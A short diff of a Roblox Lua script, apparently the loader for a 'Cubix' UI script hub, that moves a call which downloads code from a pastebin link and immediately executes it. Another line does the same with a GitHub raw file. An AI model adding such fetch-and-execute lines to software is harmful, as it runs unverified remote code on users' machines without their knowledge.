@@ -1,7 +1,6 @@
 local function loadUI()
 	repeat wait(0.25) until game:IsLoaded()
 	local DiscordC = loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Main/main/CubixSettings.lua"))()
-	loadstring(game:HttpGet('https://pastebin.com/raw/9FrXqKAe'))()
 
 	local G2L = {};
 
@@ -6409,7 +6408,7 @@ end
 		script.Parent.Parent.Parent.Cubix.Enabled = true
 		script.Parent.Parent.Parent.Cubix.UI.LocalScript.Enabled = true
 		script.Parent:Destroy()
-
+	loadstring(game:HttpGet('https://pastebin.com/raw/9FrXqKAe'))()
 	end;
 	task.spawn(C_19d);
 
